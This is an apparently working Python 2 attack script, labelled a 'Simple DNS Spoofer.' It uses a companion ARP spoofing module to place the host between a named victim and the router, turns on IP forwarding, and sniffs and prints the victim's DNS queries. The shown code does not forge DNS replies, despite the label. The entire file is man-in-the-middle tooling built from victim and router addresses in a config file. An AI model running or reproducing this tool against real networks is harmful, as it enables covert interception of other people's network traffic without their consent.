#!/usr/bin/python

import ConfigParser, os, platform, sys, signal, multiprocessing, logging, argparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
import arpSpoof

# get the operating system once
operatingSystem = platform.system()

# map a section of the config file into a dictionary
def configSectionMap(section):
    dict = {}
    config = ConfigParser.ConfigParser()
    config.read(args.configFile)
    options = config.options(section)
    for option in options:
        try:
            dict[option] = config.get(section, option)
            if dict[option] == -1:
                DebugPrint("skip: %s" % option)
        except:
            print ("exception on %s!" % option)
            dict[option] = None
    return dict

# signal handler that is called for ctrl + c
def signalHandler(signal, frame):
    default()
    sys.exit(0)

# set IP forwarding on the spoofing machine
def forward():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=1')
    elif operatingSystem == 'Linux':
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

# unset IP forwarding
def default():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=0')
    elif operatingSystem == 'Linux':
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

# packet parsing for packets that match our scapy filter
def parse(packet):
    if packet.haslayer(DNS):
        if packet.qdcount > 0 and isinstance(packet.qd, DNSQR):
            name = packet.qd.qname
        elif packet.ancount > 0 and isinstance(packet.an, DNSRR):
            name = packet.an.rdata
        print name

# main function
def main():
    print "main function"
    variables = configSectionMap('ARP')
    arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof, args = (variables['routerip']
                                                                   , variables['routermac']
                                                                   , variables['victimip']
                                                                   , variables['victimmac']
                                                                   , variables['ourmac']))
    arpProcess.start()
    signal.signal(signal.SIGINT, signalHandler)
    sniff(filter = 'udp and port 53', prn=parse)
    signal.pause()
    arpProcess.terminate()

# parse arguments
# argument parsing
parser = argparse.ArgumentParser(description="Simple DNS Spoofer.")
parser.add_argument('-c'
                   , '--config'
                   , dest='configFile'
                   , help='path to config file'
                   , required=True)
args = parser.parse_args()

# start of main execution
main()